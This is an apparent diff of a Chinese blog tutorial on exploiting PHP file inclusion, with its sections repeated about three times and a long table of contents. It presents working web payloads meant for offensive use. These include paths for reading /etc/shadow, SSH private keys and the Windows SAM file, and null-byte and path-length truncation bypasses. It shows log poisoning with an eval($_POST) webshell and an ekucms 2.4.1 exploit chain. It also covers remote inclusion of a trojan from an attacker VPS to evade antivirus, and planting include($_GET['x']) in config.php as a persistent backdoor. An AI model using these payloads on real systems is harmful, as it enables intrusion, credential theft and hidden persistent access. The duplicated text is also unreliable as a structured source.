+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-7">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-7">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-8">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-8">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-8">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-8">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-8">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-8">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-8">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-8">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-8">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-8">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-8">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-8">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-8">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-8">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-8">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-8">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-9">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-9">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-9">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-9">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-9">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-9">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-9">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-9">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-9">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-9">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-9">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-9">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-9">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-9">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-9">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-9">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-2">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-2">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-2">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-2">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-2">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-2">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-2">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-2">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-2">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-2">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-2">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-2">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-3">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-3">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-3">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-3">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-3">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-3">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-3">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-3">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-3">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-3">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-3">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-3">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-3">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-3">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-4">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-4">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-4">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-4">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-4">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-4">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-4">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%8B%BFshell-4">包含日志拿shell</a>
+<ul>
+<li><a href="#%E6%8B%BFshell%E6%AD%A5%E9%AA%A4-4">拿shell步骤</a></li>
+<li><a href="#%E5%AE%9E%E5%88%97-4">实列</a></li>
+</ul>
+</li>
+<li><a href="#%E8%AF%BB%E6%BA%90%E4%BB%A3%E7%A0%81-4">读源代码</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-4">远程文件包含</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6-4">远程包含限制绕过后缀名限制</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-4">利用远程文件包含进行权限维持</a></li>
+</ul>
+</li>
+<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-5">php文件包含漏洞</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0-5">常见包含函数</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5">利用条件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-5">文件包含</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5">利用方法</a></li>
+<li><a href="#%E5%AE%9E%E4%BE%8B-5">实例</a></li>
+<li><a href="#%E9%99%84%E5%8A%A0%E5%90%8E%E7%BC%80%E6%88%AA%E6%96%AD-5">附加后缀截断</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%8000%E6%88%AA%E6%96%AD-5">绕过方法一：%00截断</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%E6%96%87%E4%BB%B6%E5%90%8D%E9%99%84%E5%8A%A0%E8%BF%9B%E8%A1%8C%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD-5">绕过方法二：文件名附加./././././.进行长度截断</a></li>
+</ul>
+</li>
